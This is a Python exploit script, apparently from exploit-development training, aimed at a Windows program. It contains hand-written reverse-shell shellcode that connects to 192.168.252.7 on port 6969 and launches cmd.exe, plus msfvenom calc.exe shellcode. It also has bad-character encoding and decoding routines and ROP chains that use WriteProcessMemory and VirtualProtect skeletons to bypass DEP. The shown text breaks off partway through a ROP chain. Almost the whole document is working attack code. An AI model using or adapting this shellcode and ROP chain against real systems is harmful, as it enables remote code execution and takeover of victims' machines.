#!/usr/bin/python3
import sys
from struct import pack
import argparse
import socket
import os
import traceback
import time
import binascii

# Set timeout
timeout = 3

# Global vars
host = None
port = None
gsock = None

# Badchars
badchars = [ 0x0 ,0x1, 0x2 ,0x3,0x4 ,0x5 ,0x6, 0x7, 0x8, 0x9, 0xa, 0xb, 0xc, 0xd, 0x20, 0x2F, 0x5C]

class Colors:
    """ ANSI color codes """
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    CYAN = "\033[0;36m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"
    END = "\033[0m"
    # cancel SGR codes if we don't write to a terminal
    if not __import__("sys").stdout.isatty():
        for _ in dir():
            if isinstance(_, str) and _[0] != "_":
                locals()[_] = ""
    else:
        # set Windows console in VT mode
        if __import__("platform").system() == "Windows":
            kernel32 = __import__("ctypes").windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            del kernel32

class Helpers:
    def colorBadbytes(originalsc,encodedsc):
        outsclines = []
        outrplines = []
        outwidth = 40
        bclines = []
        sclines = []
        eclines = []
        lenhex = 4

        # Badchars
        badchars = Badchars.programbadchars

        # Convert badchar bytes to pretty "\x" encoded string
        prettyBadchars = Helpers.convertPrettyHex(badchars)
        # Already mapped during earlier calls; make sure to do so, if not
        mappedBadchars = Shellcode.mappedbadscchars

        # Strip per 4 chars for hex prefixed output
        for i in range(0, len(prettyBadchars), lenhex):
            bclines.append(prettyBadchars[i:i+lenhex])
        for i in range(0, len(originalsc), lenhex):
            sclines.append(originalsc[i:i+lenhex])
        for i in range(0, len(encodedsc), lenhex):
            eclines.append(encodedsc[i:i+lenhex])

        # Compare if badchars show up in shellcode and color if so
        # Check and color badchars
        outsclines.append("original_shellcode = (\n\tb\"")
        sccolor = ""
        for i, char in enumerate(sclines,1):
            # Add bad char colored red
            if char in bclines:
                colorchar = Colors.RED + char + Colors.END
                sccolor += [colorchar,'"\n\tb"'][i % outwidth == 0]
            # Add char without color
            else:
                sccolor += [char,'"\n\tb"'][i % outwidth == 0]
        outsclines.append(sccolor + "\"\n)\n")
        coloredsc = ''.join(outsclines)

        # Check and color replaced chars
        outrplines.append("encoded_shellcode = (\n\tb\"")
        sccolor = ""
        for i, char in enumerate(eclines,1):
            # Add replacement char colored green
            if i-1 in mappedBadchars:
                colorchar = Colors.GREEN + char + Colors.END
                sccolor += [colorchar,'"\n\tb"'][i % outwidth == 0]
            else:
                sccolor += [char,'"\n\tb"'][i % outwidth == 0]
        outrplines.append(sccolor + "\"\n)\n")
        coloredrp = ''.join(outrplines)

        return coloredsc,coloredrp

    def decodeShellcode(intbase,shellcode,offsetDecoding):
        # Loop over badchar indexes
        restoreRop = []
        replacements = Badchars.replacements
        badIndices = Shellcode.mappedbadscchars

        for i in range(len(badIndices)):
            # Calculate offset from previous badchar to current
            if i == 0:
                offset = badIndices[i]
            else:
                offset = badIndices[i] - badIndices[i-1]

            neg_offset = (-offset) & 0xffffffff
            value = 0

            # Iterate over every bad char & add offset to all of them
            for j in range(len(badchars)):
                if shellcode[badIndices[i]] == badchars[j]:
                    value = replacements[j]
            # Value to use for offsetting
            value = 0x11111100 + offsetDecoding

            # ROP; program specific
            restoreRop_gadgets = [
                # get offset to next bad char into ecx
                intbase + 0x8f784,   # pop ecx ; ret ;
                neg_offset,
                # adjust eax by this offset to point to next bad char
                intbase + 0x3ec4c,   # sub eax, ecx ; pop ebp ; ret ;
                0x41414141,
                intbase + 0x8f784,   # pop ecx ; ret ;
                value,
                intbase + 0x7f17a,   # add byte [eax], cl ; add cl, cl ; ret ;
            ]
            for gadget in restoreRop_gadgets:
                restoreRop.append(gadget)
        return restoreRop

    def encodeShellcode(sh,offsetEncoding):
        replacements = []
        badchars = Badchars.programbadchars
        for c in badchars:
            new = c + offsetEncoding
            if new < 0:
                new += 256
            replacements.append(new)

        print("[*] Badchars:     " + Colors.RED + Helpers.convertPrettyHex(badchars) + Colors.END)
        print("[*] Replacements: " + Colors.GREEN + Helpers.convertPrettyHex(replacements) + "\n" + Colors.END)
        badchars = bytes(badchars)
        replacements = bytes(replacements)

        transTable = sh.maketrans(badchars, replacements)
        encodedsh = sh.translate(transTable)
        hexencodedsh = Helpers.convertPrettyHex(encodedsh)
        Badchars.replacements = replacements

        return encodedsh,hexencodedsh

    def mapBadChars(sh):
        i = 0
        badIndex = []

        while i < len(sh):
            for c in badchars:
                if sh[i] == c:
                    badIndex.append(i)
            i=i+1
        return badIndex

    def containsBadchars(hexaddr,checkhalf):
        startchar = 2
        endchar = 2
        if checkhalf == 'upper':
            checkhex = hexaddr[:startchar]
        if checkhalf == 'lower':
            checkhex = hexaddr[endchar:]
        else:
            checkhex = hexaddr
        strBadAddress = '0x' + binascii.hexlify(checkhex).decode('ascii')
        for char in checkhex:
            if char in badchars:
                print("[-] Error: bad character " + str(char) + " in returned address " + str(strBadAddress))
                return True
        return False

    def toByteHex(hexaddr):
        """
        DESCR: Converts a hexaddress in stringformat to bytes
        IN: String hex address; 0x12345678
        OUT: Byte address
        """
        lenAddr = 8
        toByteHex = bytes.fromhex(hexaddr.lstrip('0x').rjust(lenAddr, '0'))
        return toByteHex

    def convertPrettyHex(sh):
        """
        DESCR: Prefix each shellcode char with \\x
        IN: Shellcode
        OUT: \\x prefixed shellcode
        """
        hexencoded = "".join(map('\\x{:02x}'.format, sh))
        return hexencoded

    def negate(val, nbits=32):
        return (val + (1 << nbits)) % (1 << nbits)

    def addhex(offset, nbits = 32):
        largeVal = 0x88888888
        val = offset - largeVal
        return (val + (1 << nbits)) % (1 << nbits)

    def keyboard_interrupt():
        """Handles keyboardinterrupt exceptions"""""
        print("\n\n[*] User requested an interrupt, exiting...")
        exit(0)

class Badchars:
    def programbadchars():
        i = 0
        programbadChars = []

        for c in badchars:
            programbadChars.append(i)
        return programbadChars

    def replacements():
        i = 0
        programbadscReplace = []

        for c in badchars:
            programbadscReplace.append(i)
        return programbadscReplace

    def allchars():
        chars = (
            b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
            b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
            b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
            b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
            b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
            b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
            b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
            b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
        return chars

    def defaultbadchars():
        chars = (
            b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
            b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
            b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
            b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
            b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
            b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
            b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
            b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
            b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
            b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
            b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
            b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
            b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
            b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
            b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
            b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
        return chars

class Shellcode:
    def originalShellcode():
        # Custom revshell
        # lhost 192.168.252.7 lport 6969
        shellcode = (
                b"\x89\xe5"                        # 0x0         mov  ebp, esp
                b"\x81\xc4\xf0\xf9\xff\xff"        # 0x2         add  esp, 0xfffff9f0
                b"\x31\xc9"                        # 0x8         xor  ecx, ecx
                b"\x64\x8b\x71\x30"                # 0x10        mov  esi, dword ptr fs:[ecx + 0x30]
                b"\x8b\x76\x0c"                    # 0x14        mov  esi, dword ptr [esi + 0xc]
                b"\x8b\x76\x1c"                    # 0x17        mov  esi, dword ptr [esi + 0x1c]
                b"\x8b\x5e\x08"                    # 0x20        mov  ebx, dword ptr [esi + 8]
                b"\x8b\x7e\x20"                    # 0x23        mov  edi, dword ptr [esi + 0x20]
                b"\x8b\x36"                        # 0x26        mov  esi, dword ptr [esi]
                b"\x66\x39\x4f\x18"                # 0x28        cmp  word ptr [edi + 0x18], cx
                b"\x75\xf2"                        # 0x32        jne  0x14
                b"\xeb\x06"                        # 0x34        jmp  0x2a
                b"\x5e"                            # 0x36        pop  esi
                b"\x89\x75\x04"                    # 0x37        mov  dword ptr [ebp + 4], esi
                b"\xeb\x54"                        # 0x40        jmp  0x7e
                b"\xe8\xf5\xff\xff\xff"            # 0x42        call 0x24
                b"\x60"                            # 0x47        pushal
                b"\x8b\x43\x3c"                    # 0x48        mov  eax, dword ptr [ebx + 0x3c]
                b"\x8b\x7c\x03\x78"                # 0x51        mov  edi, dword ptr [ebx + eax + 0x78]
                b"\x01\xdf"                        # 0x55        add  edi, ebx
                b"\x8b\x4f\x18"                    # 0x57        mov  ecx, dword ptr [edi + 0x18]
                b"\x8b\x47\x20"                    # 0x60        mov  eax, dword ptr [edi + 0x20]
                b"\x01\xd8"                        # 0x63        add  eax, ebx
                b"\x89\x45\xfc"                    # 0x65        mov  dword ptr [ebp - 4], eax
                b"\xe3\x36"                        # 0x68        jecxz0x7c
                b"\x49"                            # 0x70        dec  ecx
                b"\x8b\x45\xfc"                    # 0x71        mov  eax, dword ptr [ebp - 4]
                b"\x8b\x34\x88"                    # 0x74        mov  esi, dword ptr [eax + ecx*4]
                b"\x01\xde"                        # 0x77        add  esi, ebx
                b"\x31\xc0"                        # 0x79        xor  eax, eax
                b"\x99"                            # 0x81        cdq
                b"\xfc"                            # 0x82        cld
                b"\xac"                            # 0x83        lodsbal, byte ptr [esi]
                b"\x84\xc0"                        # 0x84        test al, al
                b"\x74\x07"                        # 0x86        je   0x5f
                b"\xc1\xca\x0d"                    # 0x88        ror  edx, 0xd
                b"\x01\xc2"                        # 0x91        add  edx, eax
                b"\xeb\xf4"                        # 0x93        jmp  0x53
                b"\x3b\x54\x24\x24"                # 0x95        cmp  edx, dword ptr [esp + 0x24]
                b"\x75\xdf"                        # 0x99        jne  0x44
                b"\x8b\x57\x24"                    # 0x101       mov  edx, dword ptr [edi + 0x24]
                b"\x01\xda"                        # 0x104       add  edx, ebx
                b"\x66\x8b\x0c\x4a"                # 0x106       mov  cx, word ptr [edx + ecx*2]
                b"\x8b\x57\x1c"                    # 0x110       mov  edx, dword ptr [edi + 0x1c]
                b"\x01\xda"                        # 0x113       add  edx, ebx
                b"\x8b\x04\x8a"                    # 0x115       mov  eax, dword ptr [edx + ecx*4]
                b"\x01\xd8"                        # 0x118       add  eax, ebx
                b"\x89\x44\x24\x1c"                # 0x120       mov  dword ptr [esp + 0x1c], eax
                b"\x61"                            # 0x124       popal
                b"\xc3"                            # 0x125       ret
                b"\x68\x83\xb9\xb5\x78"            # 0x126       push 0x78b5b983
                b"\xff\x55\x04"                    # 0x131       call dword ptr [ebp + 4]
                b"\x89\x45\x10"                    # 0x134       mov  dword ptr [ebp + 0x10], eax
                b"\x68\x8e\x4e\x0e\xec"            # 0x137       push 0xec0e4e8e
                b"\xff\x55\x04"                    # 0x142       call dword ptr [ebp + 4]
                b"\x89\x45\x14"                    # 0x145       mov  dword ptr [ebp + 0x14], eax
                b"\x68\x72\xfe\xb3\x16"            # 0x148       push 0x16b3fe72
                b"\xff\x55\x04"                    # 0x153       call dword ptr [ebp + 4]
                b"\x89\x45\x18"                    # 0x156       mov  dword ptr [ebp + 0x18], eax
                b"\x31\xc0"                        # 0x159       xor  eax, eax
                b"\x66\xb8\x6c\x6c"                # 0x161       mov  ax, 0x6c6c
                b"\x50"                            # 0x165       push eax
                b"\x68\x33\x32\x2e\x64"            # 0x166       push 0x642e3233
                b"\x68\x77\x73\x32\x5f"            # 0x171       push 0x5f327377
                b"\x54"                            # 0x176       push esp
                b"\xff\x55\x14"                    # 0x177       call dword ptr [ebp + 0x14]
                b"\x89\xc3"                        # 0x180       mov  ebx, eax
                b"\x68\xcb\xed\xfc\x3b"            # 0x182       push 0x3bfcedcb
                b"\xff\x55\x04"                    # 0x187       call dword ptr [ebp + 4]
                b"\x89\x45\x1c"                    # 0x190       mov  dword ptr [ebp + 0x1c], eax
                b"\x68\xd9\x09\xf5\xad"            # 0x193       push 0xadf509d9
                b"\xff\x55\x04"                    # 0x198       call dword ptr [ebp + 4]
                b"\x89\x45\x20"                    # 0x201       mov  dword ptr [ebp + 0x20], eax
                b"\x68\x0c\xba\x2d\xb3"            # 0x204       push 0xb32dba0c
                b"\xff\x55\x04"                    # 0x209       call dword ptr [ebp + 4]
                b"\x89\x45\x24"                    # 0x212       mov  dword ptr [ebp + 0x24], eax
                b"\x31\xdb"                        # 0x215       xor  ebx, ebx
                b"\x66\xbb\x90\x01"                # 0x217       mov  bx, 0x190
                b"\x29\xdc"                        # 0x221       sub  esp, ebx
                b"\x54"                            # 0x223       push esp
                b"\x83\xc3\x72"                    # 0x224       add  ebx, 0x72
                b"\x53"                            # 0x227       push ebx
                b"\xff\x55\x1c"                    # 0x228       call dword ptr [ebp + 0x1c]
                b"\x31\xc0"                        # 0x231       xor  eax, eax
                b"\x50"                            # 0x233       push eax
                b"\x50"                            # 0x234       push eax
                b"\x50"                            # 0x235       push eax
                b"\xb0\x06"                        # 0x236       mov  al, 6
                b"\x50"                            # 0x238       push eax
                b"\x2c\x05"                        # 0x239       sub  al, 5
                b"\x50"                            # 0x241       push eax
                b"\x40"                            # 0x242       inc  eax
                b"\x50"                            # 0x243       push eax
                b"\xff\x55\x20"                    # 0x244       call dword ptr [ebp + 0x20]
                b"\x89\xc6"                        # 0x247       mov  esi, eax
                b"\x31\xc0"                        # 0x249       xor  eax, eax
                b"\x50"                            # 0x251       push eax
                b"\x50"                            # 0x252       push eax
                b"\x68\xc0\xa8\xfc\x07"            # 0x253       push 0xafca8c0
                b"\x66\xb8\x1b\x39"                # 0x258       mov  ax, 0x391b
                b"\xc1\xe0\x10"                    # 0x262       shl  eax, 0x10
                b"\x66\x83\xc0\x02"                # 0x265       add  ax, 2
                b"\x50"                            # 0x269       push eax
                b"\x54"                            # 0x270       push esp
                b"\x5f"                            # 0x271       pop  edi
                b"\x31\xc0"                        # 0x272       xor  eax, eax
                b"\x50"                            # 0x274       push eax
                b"\x50"                            # 0x275       push eax
                b"\x50"                            # 0x276       push eax
                b"\x50"                            # 0x277       push eax
                b"\x04\x10"                        # 0x278       add  al, 0x10
                b"\x50"                            # 0x280       push eax
                b"\x57"                            # 0x281       push edi
                b"\x56"                            # 0x282       push esi
                b"\xff\x55\x24"                    # 0x283       call dword ptr [ebp + 0x24]
                b"\x56"                            # 0x286       push esi
                b"\x56"                            # 0x287       push esi
                b"\x56"                            # 0x288       push esi
                b"\x31\xc0"                        # 0x289       xor  eax, eax
                b"\x50"                            # 0x291       push eax
                b"\x50"                            # 0x292       push eax
                b"\xb8\xfe\xfe\xff\xff"            # 0x293       mov  eax, 0xfffffefe
                b"\xf7\xd8"                        # 0x298       neg  eax
                b"\x50"                            # 0x300       push eax
                b"\x31\xc0"                        # 0x301       xor  eax, eax
                b"\x50"                            # 0x303       push eax
                b"\x50"                            # 0x304       push eax
                b"\x50"                            # 0x305       push eax
                b"\x50"                            # 0x306       push eax
                b"\x50"                            # 0x307       push eax
                b"\x50"                            # 0x308       push eax
                b"\x50"                            # 0x309       push eax
                b"\x50"                            # 0x310       push eax
                b"\x50"                            # 0x311       push eax
                b"\x50"                            # 0x312       push eax
                b"\xb0\x44"                        # 0x313       mov  al, 0x44
                b"\x50"                            # 0x315       push eax
                b"\x54"                            # 0x316       push esp
                b"\x5f"                            # 0x317       pop  edi
                b"\xb8\x9b\x87\x9a\xff"            # 0x318       mov  eax, 0xff9a879b
                b"\xf7\xd8"                        # 0x323       neg  eax
                b"\x50"                            # 0x325       push eax
                b"\x68\x63\x6d\x64\x2e"            # 0x326       push 0x2e646d63
                b"\x54"                            # 0x331       push esp
                b"\x5b"                            # 0x332       pop  ebx
                b"\x89\xe0"                        # 0x333       mov  eax, esp
                b"\x31\xc9"                        # 0x335       xor  ecx, ecx
                b"\x66\x81\xc1\x90\x03"            # 0x337       add  cx, 0x390
                b"\x29\xc8"                        # 0x342       sub  eax, ecx
                b"\x50"                            # 0x344       push eax
                b"\x57"                            # 0x345       push edi
                b"\x31\xc0"                        # 0x346       xor  eax, eax
                b"\x50"                            # 0x348       push eax
                b"\x50"                            # 0x349       push eax
                b"\x50"                            # 0x350       push eax
                b"\x40"                            # 0x351       inc  eax
                b"\x50"                            # 0x352       push eax
                b"\x48"                            # 0x353       dec  eax
                b"\x50"                            # 0x354       push eax
                b"\x50"                            # 0x355       push eax
                b"\x53"                            # 0x356       push ebx
                b"\x50"                            # 0x357       push eax
                b"\xff\x55\x18"                    # 0x358       call dword ptr [ebp + 0x18]
                b"\x31\xc9"                        # 0x361       xor  ecx, ecx
                b"\x51"                            # 0x363       push ecx
                b"\x6a\xff"                        # 0x364       push -1
                b"\xff\x55\x10"                    # 0x366       call dword ptr [ebp + 0x10]
        )
        return shellcode

    def msfShellcodeCalc():
        # msfvenom -p windows/exec CMD="calc.exe" -a x86 -f python -v sc -e shellcode
        # Payload size: 193 bytes
        shellcode =  b""
        shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
        shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
        shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
        shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
        shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
        shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
        shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
        shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
        shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
        shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
        shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
        shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
        shellcode += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
        shellcode += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
        shellcode += b"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
        shellcode += b"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
        shellcode += b"\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c"
        shellcode += b"\x63\x2e\x65\x78\x65\x00"
        return shellcode

    def encodedShellcode():
        shellcode = b""
        return shellcode

    def encodedShellcodeHex():
        shellcode = b""
        return shellcode

    def mappedbadscchars():
        badchars = b""
        return badchars

    def markedbadscchars():
        markedchars = []
        return markedchars

class ROP:

    def wpmSkeleton():
        rop_skel_gadgets = [
            0x41414141,                             # WriteProcessMemory address                                    # offsetk32heapfree -- offsetk32wpm
            0x42424242,                             # Shellcode ret address                                         # ropskelcodecave  ; intbasemain + 0x8fb00
            0xFFFFFFFF,                             # hProcess; Process handle == current process
            0x43434343,                             # lpBaseAddress; start of codecave address to write to, .text   # ropskelcodecave  ; intbasemain + 0x8fb00
            0x44444444,                             # lpBuffer; Code to be copied                                   # ropskelscSrc
            0x45454545,                             # nSize
            0x46464646,                             # *lpNumberOfBytesWritten                                       # offsetwritable   ; intbasemain + 0xa932c
        ]
        return rop_skel_gadgets

    def vaSkeleton():
        rop_skel_gadgets = [
            0x41414141,                             # VirtualAlloc address
            0x42424242,                             # Shellcode ret address
            0x43434343,                             # lpAddress; shellcode address, same as above
            0x44444444,                             # dwSize; size of shellcode == 0x1
            0x45454545,                             # flAllocationType == 0x1000
            0x46464646,                             # flProtect == 0x40
        ]
        return rop_skel_gadgets

    def vpSkeleton():
        rop_skel_gadgets = [
            0x41414141,                             # VirtualProtect address
            0x42424242,                             # Shellcode ret address
            0x43434343,                             # lpAddress; shellcode address, same as above
            0x44444444,                             # dwSize; size of shellcode
            0x45454545,                             # flNewProtect == 0x40 RWX
            0x46464646,                             # lpflOldProtect; some writable address
        ]
        return rop_skel_gadgets

    def chainAlign(intbasemain,offsetwritable,ropskeleaxscOffset):
        rop_chainAlign_gadgets = [
            ### Align EAX with shellcode ###
            # Save current ESP in EAX
            intbasemain + 0x54ff6,                  # pop eax ; ret ;
            (-(intbasemain + offsetwritable)) & 0xffffffff,           # Found by !dh and adding virtual size and virtual offset to main binary
            intbasemain + 0x31630,                  # neg eax ; pop ebp ; ret ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x683da,                  # push esp ; add  [eax], eax ; pop ecx ; ret ;
            intbasemain + 0x1778a,                  # mov eax, ecx ; ret ;
            # Use add method for EAX to calculate offset to shellcode offset
            intbasemain + 0x8ea82,                  # pop ecx ; ret ;
            0x88888888,                             # Value to add
            intbasemain + 0x17781,                  # add eax, ecx ; pop ebp ; retn 0x0004 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8ea82,                  # pop ecx ; ret ;
            Helpers.addhex(ropskeleaxscOffset),     # Value to add
            intbasemain + 0x353cf,                  # add eax, 0x10 ; ret ;
            intbasemain + 0x17781,                  # add eax, ecx ; pop ebp ; retn 0x0004 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
        ]
        return rop_chainAlign_gadgets

    def chainDecoder(intbase,shellcode,offsetDecoding):
        rop_chainDecoder_gadgets = Helpers.decodeShellcode(intbase,shellcode,offsetDecoding)
        return rop_chainDecoder_gadgets

    def chainWriteProcessMemory(intbasemain,offsetwritable,offsetk32heapfree,offsetk32wpm,ropskelfuncOffset,ropskelscSrc,ropskelAlign):
        rop_chain1_gadgets = [
            ### Future usage ###
            # Clear ESI for future usage
            intbasemain + 0x6219f,                  # xor edx, edx ; ret ;
            intbasemain + 0x33152,                  # mov edi, edx ; ret ;
            intbasemain + 0x39ece,                  # or esi, edi ; ret

            ### ESP Alignment ###
            # Save current ESP in EAX
            #intbasemain + 0x54ff6,                  # pop eax ; ret ;
            #intbasemain + offsetwritable,           # Found by !dh and adding virtual size and virtual offset to main binary
            #intbasemain + 0x683da,                  # push esp ; add  [eax], eax ; pop ecx ; ret ;
            #intbasemain + 0x1778a,                  # mov eax, ecx ; ret ;
            # Save EAX to ESI as well
            intbasemain + 0x32bf4,                  # add esi, eax ; inc ecx ; add al, 0x00 ; pop edi ; pop ebp ; ret ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            # Use add method for EAX to calculate offset to ROP skeleton
            intbasemain + 0x8ea82,                  # pop ecx ; ret ;
            0x88888888,                             # Value to add
            intbasemain + 0x17781,                  # add eax, ecx ; pop ebp ; retn 0x0004 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8ea82,                  # pop ecx ; ret ;
            Helpers.addhex(ropskelfuncOffset),      # Value to add
            intbasemain + 0x17781,                  # add eax, ecx ; pop ebp ; retn 0x0004 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x316ae,                  # add edx, ebx ; pop ebx ; retn 0x0010 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler

            ### Dereference PTR for WriteProcessMemory address ###
            # In this case, it's the KERNEL32!HeapFreeStub function
            intbasemain + 0x6f242,                  # pop eax ; ret ;
            (-(intbasemain + offsetk32heapfree)) & 0xffffffff,
            intbasemain + 0x31630,                  # neg eax ; pop ebp ; ret ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x2bb8e,                  # mov eax,  [eax] ; ret ;
            # Use add method for EAX to calculate offset to KERNEL32!WriteProcessMemory
            intbasemain + 0x8ea82,                  # pop ecx ; ret ;
            0x88888888,                             # Value to add
            intbasemain + 0x17781,                  # add eax, ecx ; pop ebp ; retn 0x0004 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8ea82,                  # pop ecx ; ret ;
            Helpers.addhex(offsetk32wpm),           # Value to add
            # intbasemain + 0x6a3ab,                  # add ecx, ecx ; ret ;
            intbasemain + 0x17781,                  # add eax, ecx ; pop ebp ; retn 0x0004 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            # Copy dereferenced value in EDX
            intbasemain + 0x4bfa0,                  # mov  [edx], eax ; ret ;

            ### Shellcode ret address in code cave  # ropskelcodecave ###
            # intbasemain + 0x8fb00
            # Move to next ROP skel argument
            intbasemain + 0x71489,                  # xor eax, eax ; ret ;
            intbasemain + 0x7609f,                  # add eax, 0x04 ; ret ;
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x316ae,                  # add edx, ebx ; pop ebx ; retn 0x0010 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
             # Calculate value by adding using existing instruction
            intbasemain + 0x4cc17,                  # pop eax ; ret ;
            intbasemain + 0x8fb79,                  # 0x8fa79 + 0x8b = 0xbfb04
            intbasemain + 0x15b41,                  # add al, 0x8B ; ret ;
            intbasemain + 0x8f7d5,                  # RET filler
            # Copy dereferenced value in EDX
